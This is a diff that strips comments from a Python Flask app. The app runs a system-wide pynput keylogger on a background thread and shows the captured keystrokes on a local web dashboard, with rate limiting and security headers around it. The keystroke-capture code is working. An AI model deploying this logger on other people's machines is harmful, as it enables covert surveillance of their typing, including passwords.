@@ -9,7 +9,6 @@ from dotenv import load_dotenv
 from flask import Flask, render_template_string, jsonify, request, make_response
 from pynput.keyboard import Key, Listener
 
-# Compatibility shim for Flask with Werkzeug 3.x+
 import werkzeug
 if not hasattr(werkzeug, '__version__'):
     import importlib.metadata
@@ -18,26 +17,20 @@ if not hasattr(werkzeug, '__version__'):
     except Exception:
         werkzeug.__version__ = '3.1.3'
 
-# Load environment configuration from .env
 load_dotenv()
 
 app = Flask(__name__)
 app.secret_key = os.getenv('SECRET_KEY', secrets.token_hex(32))
 
-# ---------------------------------------------------------
-# Keylogger Engine & State Management
-# ---------------------------------------------------------
 log_storage = []
 clean_text = ""
 storage_lock = threading.Lock()
 
 def on_press(key):
-    """Sanitizes and captures keystrokes asynchronously without XSS vulnerability."""
     global clean_text, log_storage
     
     try:
         raw_key_str = str(key).replace("'", "")
-        # Strict HTML sanitization against XSS payload injection
         key_str = html.escape(raw_key_str)
 
         with storage_lock:
@@ -63,13 +56,9 @@ def on_press(key):
         pass
 
 def start_keylogger():
-    """Runs hardware key listener on dedicated background daemon thread."""
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-# ---------------------------------------------------------
-# Sliding Window IP Rate Limiter (DoS & Abuse Prevention)
-# ---------------------------------------------------------
 class RateLimiter:
     def __init__(self):
         self.requests = {}
@@ -92,9 +81,6 @@ limiter = RateLimiter()
 def get_client_ip():
     return request.remote_addr or '127.0.0.1'
 
-# ---------------------------------------------------------
-# Security Headers & CORS Enforcement
-# ---------------------------------------------------------
 @app.after_request
 def add_security_headers(response):
     response.headers['X-Content-Type-Options'] = 'nosniff'
@@ -103,7 +89,6 @@ def add_security_headers(response):
     response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
     response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=(), payment=()'
     
-    # Strict Content Security Policy
     response.headers['Content-Security-Policy'] = (
         "default-src 'self'; "
         "script-src 'self' 'unsafe-inline'; "
@@ -114,7 +99,6 @@ def add_security_headers(response):
         "form-action 'self';"
     )
 
-    # Restrict CORS to configured origin
     origin = request.headers.get('Origin')
     allowed_origin = os.getenv('CORS_ORIGIN', 'http://127.0.0.1:5005')
     if origin and (origin == allowed_origin or allowed_origin == "*"):
@@ -124,9 +108,6 @@ def add_security_headers(response):
 
     return response
 
-# ---------------------------------------------------------
-# HUD HTML Interface (Direct Cyberpunk Terminal)
-# ---------------------------------------------------------
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -290,9 +271,6 @@ HTML_TEMPLATE = """
 </html>
 """
 
-# ---------------------------------------------------------
-# Application Endpoints
-# ---------------------------------------------------------
 @app.route('/')
 def index():
     port = os.getenv('PORT', '5005')
@@ -301,7 +279,6 @@ def index():
 @app.route('/update')
 def update():
     client_ip = get_client_ip()
-    # Rate limit: Max 120 updates per minute per client
     if not limiter.is_allowed(client_ip, 'update', max_requests=120, window_seconds=60):
         return jsonify({'error': 'Rate limit exceeded on telemetry updates'}), 429
 
@@ -318,7 +295,6 @@ def update():
 @app.route('/reset', methods=['POST'])
 def reset():
     client_ip = get_client_ip()
-    # Rate limit: Max 10 resets per minute per client
     if not limiter.is_allowed(client_ip, 'reset', max_requests=10, window_seconds=60):
         return jsonify({'error': 'Rate limit exceeded on buffer reset'}), 429
 
@@ -333,9 +309,6 @@ def reset():
         'count': 0
     })
 
-# ---------------------------------------------------------
-# Error Handlers (Zero Stack Trace Disclosure)
-# ---------------------------------------------------------
 @app.errorhandler(400)
 def bad_request(e):
     return jsonify({'error': 'Bad Request', 'code': 400}), 400
@@ -356,9 +329,6 @@ def too_many_requests(e):
 def internal_error(e):
     return jsonify({'error': 'Internal Server Error', 'code': 500}), 500
 
-# ---------------------------------------------------------
-# Server Bootstrap
-# ---------------------------------------------------------
 if __name__ == '__main__':
     host = os.getenv('HOST', '127.0.0.1')
     try:
